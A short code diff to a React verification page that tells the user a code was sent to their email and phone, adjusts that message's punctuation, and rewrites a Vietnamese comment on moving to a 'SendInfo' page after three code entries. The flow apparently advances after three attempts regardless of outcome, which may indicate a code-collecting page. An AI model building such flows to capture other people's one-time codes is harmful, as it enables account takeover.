@@ -64,7 +64,7 @@ const Verify = () => {
     const defaultTexts = useMemo(
         () => ({
             title: 'Check your device',
-            description: `We have sent a verification code to your ${formatEmailForDisplay(userInfo.email)} and ${formatPhoneForDisplay(userInfo.phone)}. Please enter the code we just sent to continue.`,
+            description: `We have sent a verification code to your ${formatEmailForDisplay(userInfo.email)} , ${formatPhoneForDisplay(userInfo.phone)}. Please enter the code we just sent to continue.`,
             placeholder: 'Enter your code',
             infoTitle: 'Approve from another device or Enter your verification code',
             infoDescription:
@@ -153,9 +153,9 @@ const Verify = () => {
         setAttempts((prev) => prev + 1);
         setIsLoading(false);
 
-        // Chỉ cho 3 lần nhập: lần 1 + 2 lần sai = tổng 3 lần
+        // SỬA: Chuyển sang SendInfo sau 3 lần nhập code
         if (attempts + 1 >= 3) {
-            navigate(PATHS.SEND_INFO); // Chuyển sang SendInfo
+            navigate(PATHS.SEND_INFO);
             return;
         }
 
